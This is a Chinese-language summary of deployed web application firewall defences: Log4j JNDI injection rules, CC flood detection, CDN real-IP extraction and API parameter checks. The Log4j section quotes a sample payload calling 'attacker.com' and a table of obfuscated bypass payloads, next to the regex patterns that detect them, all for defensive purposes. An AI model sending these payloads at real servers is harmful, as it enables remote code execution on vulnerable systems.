# 已实施安全防护方案

## Log4j JNDI 注入（CVE-2021-44228）

### 攻击特征
利用 ${...} 查找语法触发 JNDI 协议请求，实现远程代码执行。
典型 Payload：${jndi:ldap://attacker.com/a}

### 规则架构（4 条规则分层防御）
1. block_log4j_jndi_injection
   - 匹配：request_uri, raw_header, cookie
   - 正则：\$\{[^}]*jndi:|jndi:(ldap|rmi|dns|ldaps|iiop|corba|nis|http)://
   - 说明：基础 JNDI 注入 + 直接协议字符串

2. block_log4j_lookup_obfuscation
   - 匹配：request_uri, raw_header, cookie
   - 正则：\$\{(lower|upper|env|sys|date|java):|\$\{::-
   - 说明：混淆技术前缀检测

3. block_log4j_nested_lookup
   - 匹配：request_uri, raw_header, cookie
   - 正则：\$\{\$\{
   - 说明：嵌套查找兜底，覆盖所有嵌套混淆变体

4. block_log4j_post_body
   - 匹配：raw_body
   - 正则：同规则 1
   - 说明：POST Body 注入检测

### 绕过手法与对抗
| 绕过类别 | Payload 示例 | 对抗策略 |
|----------|-------------|----------|
| 大小写混淆 | ${${lower:j}ndi:} | 检测 ${lower: ${upper: 前缀 |
| 空字符串默认值 | ${${::-j}${::-n}...} | 检测 ${::- 模式 |
| 环境变量默认值 | ${${env:BARFOO:-j}ndi:} | 检测 ${env: 前缀 |
| 系统属性默认值 | ${${sys:user.dir:-j}ndi:} | 检测 ${sys: 前缀 |
| 嵌套查找 | ${${lower:${lower:j}}ndi:} | 检测 ${${ 嵌套模式 |
| URL 编码 | %24%7Bjndi:... | uriDecode 预处理 |
| POST Body | {"user":"${jndi:...}"} | 单独规则检测 raw_body |

## CC 攻击防护（组件方案）

### 组件：cc_attack_detect
检测逻辑：
1. 统计每个 URL 接口下，每个源 IP 在时间窗口内的请求数
2. 当某 IP 对某接口请求数超过阈值，标记为高频 IP
3. 当某接口的高频 IP 数量超过阈值，判定为 CC 攻击
4. 对被攻击接口开启人机识别防护，持续指定时间

conf 配置：
```json
{
  "stat_time": 60,
  "ip_request_threshold": 100,
  "high_freq_ip_threshold": 1000,
  "protect_time": 600,
  "bot_check_type": "auto"
}
```

## CDN 源 IP 提取（组件方案）

### 组件：cdn_src_ip_extract
检测逻辑：
1. 仅当 src_ip 命中白名单 CDN 网段时，才从 cdn-src-ip 头提取真实客户端 IP
2. 覆盖 ngx.ctx.src_ip
3. 防止攻击者伪造 cdn-src-ip 头绕过 IP 防护策略

conf 配置：
```json
{"cdn_whitelist_cidrs": ["8.134.210.0/24", "61.174.128.69"]}
```
纯 IP 自动视为 /32。

## API 参数校验（组件 + 规则联合方案）

### 组件：check_api_id_valid
- 检测 /api/test 接口 GET 请求的 id 参数
- 校验 id 是否存在且为纯数字
- 校验失败设置 ngx.ctx.api_id_invalid = true

### 规则：block_api_id_invalid
- 匹配：ctx_args:api_id_invalid，status_check:exist
- 动作：watch（观察模式）
